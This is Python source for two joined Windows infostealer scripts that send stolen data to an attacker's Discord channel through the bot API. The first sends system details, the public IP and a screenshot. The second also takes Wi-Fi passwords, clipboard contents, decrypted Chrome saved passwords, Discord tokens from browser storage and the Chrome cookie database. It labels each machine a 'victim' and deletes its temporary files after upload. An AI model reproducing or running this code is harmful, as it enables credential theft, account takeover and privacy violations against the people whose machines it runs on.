import os, sys, json, base64, re, subprocess, time, shutil, sqlite3, platform
from datetime import datetime
import requests
from PIL import ImageGrab

# --- CONFIGURATION (EDIT THESE) ---
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
CHANNEL_ID = 123456789012345678  # integer, no quotes
# ---------------------------------

HEADERS = {"Authorization": f"Bot {BOT_TOKEN}", "User-Agent": "Mozilla/5.0"}

def discord_send(content=None, filepath=None):
    """Send message or file to Discord channel."""
    url = f"https://discord.com/api/v10/channels/{CHANNEL_ID}/messages"
    try:
        if filepath:
            with open(filepath, "rb") as f:
                files = {"file": (os.path.basename(filepath), f)}
                r = requests.post(url, headers=HEADERS, files=files)
            print(f"Send file {filepath}: {r.status_code} {r.text}")
        elif content:
            r = requests.post(url, headers=HEADERS, json={"content": content})
            print(f"Send message: {r.status_code} {r.text}")
    except Exception as e:
        print(f"Discord send error: {e}")

def test_connection():
    """Test if bot token and channel ID are valid."""
    url = f"https://discord.com/api/v10/channels/{CHANNEL_ID}"
    r = requests.get(url, headers=HEADERS)
    if r.status_code == 200:
        print("✅ Bot token and channel ID are valid.")
        return True
    else:
        print(f"❌ Invalid: {r.status_code} - {r.text}")
        return False

def get_system_info():
    try:
        ip = requests.get("https://api.ipify.org", timeout=5).text
    except:
        ip = "unknown"
    info = (
        f"**Victim:** `{os.getenv('COMPUTERNAME', 'unknown')}_{os.getenv('USERNAME', 'unknown')}`\n"
        f"**User:** `{os.getenv('USERNAME')}`\n"
        f"**Computer:** `{os.getenv('COMPUTERNAME')}`\n"
        f"**OS:** `{platform.platform()}`\n"
        f"**IP:** `{ip}`\n"
        f"**Time:** `{datetime.now().isoformat()}`"
    )
    discord_send(content=info)

def get_screenshot():
    try:
        img = ImageGrab.grab()
        img.save("screenshot.png")
        discord_send(filepath="screenshot.png")
        os.remove("screenshot.png")
    except Exception as e:
        print(f"Screenshot error: {e}")

def main():
    print("Starting logger...")
    if not test_connection():
        print("Exiting due to invalid credentials.")
        return
    discord_send(content="**=== NEW VICTIM ===**")
    get_system_info()
    time.sleep(1)
    get_screenshot()
    discord_send(content="**=== COLLECTION COMPLETE ===**")

if __name__ == "__main__":
    main()import os, sys, json, base64, re, subprocess, time, shutil, sqlite3, platform, winreg, ctypes
from datetime import datetime
from pathlib import Path
import requests
from PIL import ImageGrab
import win32crypt
from Crypto.Cipher import AES

# --- CONFIGURATION ---
# Set to None to prompt at runtime, or put your values here
BOT_TOKEN = None    # e.g., "MTIzNDU2Nzg5MDEyMzQ1Njc4..."
CHANNEL_ID = None   # e.g., 123456789012345678
# --------------------

if BOT_TOKEN is None:
    BOT_TOKEN = input("Enter Discord bot token: ").strip()
if CHANNEL_ID is None:
    CHANNEL_ID = int(input("Enter Discord channel ID: ").strip())

HEADERS = {"Authorization": f"Bot {BOT_TOKEN}", "User-Agent": "Mozilla/5.0"}

def discord_send(content=None, filepath=None):
    """Send message or file to Discord channel."""
    url = f"https://discord.com/api/v10/channels/{CHANNEL_ID}/messages"
    if filepath:
        with open(filepath, "rb") as f:
            files = {"file": (os.path.basename(filepath), f)}
            requests.post(url, headers=HEADERS, files=files)
    elif content:
        requests.post(url, headers=HEADERS, json={"content": content})

def get_system_info():
    try:
        ip = requests.get("https://api.ipify.org", timeout=5).text
    except:
        ip = "unknown"
    info = (
        f"**Victim ID:** `{os.getenv('COMPUTERNAME', 'unknown')}_{os.getenv('USERNAME', 'unknown')}`\n"
        f"**User:** `{os.getenv('USERNAME')}`\n"
        f"**Computer:** `{os.getenv('COMPUTERNAME')}`\n"
        f"**OS:** `{platform.platform()}`\n"
        f"**IP:** `{ip}`\n"
        f"**Time:** `{datetime.now().isoformat()}`"
    )
    discord_send(content=info)

def get_screenshot():
    try:
        img = ImageGrab.grab()
        img.save("screenshot.png")
        discord_send(filepath="screenshot.png")
        os.remove("screenshot.png")
    except:
        pass

def get_wifi_passwords():
    try:
        output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True).stdout
        profiles = re.findall(r"All User Profile\s*:\s(.*)", output)
        wifi_data = []
        for p in profiles:
            res = subprocess.run(["netsh", "wlan", "show", "profile", p, "key=clear"], capture_output=True, text=True).stdout
            key = re.search(r"Key Content\s*:\s(.*)", res)
            wifi_data.append(f"{p}: {key.group(1) if key else 'No password'}")
        if wifi_data:
            with open("wifi.txt", "w") as f:
                f.write("\n".join(wifi_data))
            discord_send(filepath="wifi.txt")
            os.remove("wifi.txt")
    except:
        pass

def get_clipboard():
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        if data:
            discord_send(content=f"**Clipboard:** `{data[:500]}`")
    except:
        pass

def get_chrome_passwords():
    # Works for Chrome, Edge, Brave
    local_state_path = os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State")
    if not os.path.exists(local_state_path):
        return
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    login_db_path = os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data")
    if not os.path.exists(login_db_path):
        return
    shutil.copy2(login_db_path, "logins.db")
    conn = sqlite3.connect("logins.db")
    c = conn.cursor()
    c.execute("SELECT origin_url, username_value, password_value FROM logins")
    rows = c.fetchall()
    conn.close()
    os.remove("logins.db")

    credentials = []
    for url, user, enc_pass in rows:
        if not enc_pass:
            continue
        try:
            iv = enc_pass[3:15]
            payload = enc_pass[15:-16]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            password = cipher.decrypt(payload).decode()
            credentials.append(f"{url} | {user} | {password}")
        except:
            credentials.append(f"{url} | {user} | [decrypt failed]")
    if credentials:
        with open("passwords.txt", "w") as f:
            f.write("\n".join(credentials))
        discord_send(filepath="passwords.txt")
        os.remove("passwords.txt")

def get_discord_tokens():
    # Discord tokens from Chrome/Edge/Brave leveldb
    local = os.getenv("LOCALAPPDATA", "")
    roaming = os.getenv("APPDATA", "")
    paths = {
        'Chrome': local + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
        'Edge': local + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
        'Brave': local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
        'Discord': roaming + "\\discord\\Local Storage\\leveldb",
        'Discord Canary': roaming + "\\discordcanary\\Local Storage\\leveldb",
        'Discord PTB': roaming + "\\discordptb\\Local Storage\\leveldb"
    }
    tokens = set()
    for name, p in paths.items():
        if not os.path.exists(p):
            continue
        for file in os.listdir(p):
            if not file.endswith((".ldb", ".log")):
                continue
            with open(os.path.join(p, file), "r", errors="ignore") as f:
                content = f.read()
                found = re.findall(r"dQw4w9WgXcQ:[^\"]*", content)
                for t in found:
                    tokens.add(t.split(":")[1])
    if tokens:
        with open("tokens.txt", "w") as f:
            f.write("\n".join(tokens))
        discord_send(filepath="tokens.txt")
        os.remove("tokens.txt")

def get_cookies():
    # Chrome cookies (encrypted)
    cookie_path = os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cookies")
    if os.path.exists(cookie_path):
        shutil.copy2(cookie_path, "cookies.db")
        discord_send(filepath="cookies.db")
        os.remove("cookies.db")

def main():
    discord_send(content="**=== NEW VICTIM ===**")
    get_system_info()
    time.sleep(2)
    get_screenshot()
    time.sleep(1)
    get_wifi_passwords()
    time.sleep(1)
    get_clipboard()
    time.sleep(1)
    get_chrome_passwords()
    time.sleep(1)
    get_discord_tokens()
    time.sleep(1)
    get_cookies()
    discord_send(content="**=== COLLECTION COMPLETE ===**")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        discord_send(content=f"Error: {str(e)}")
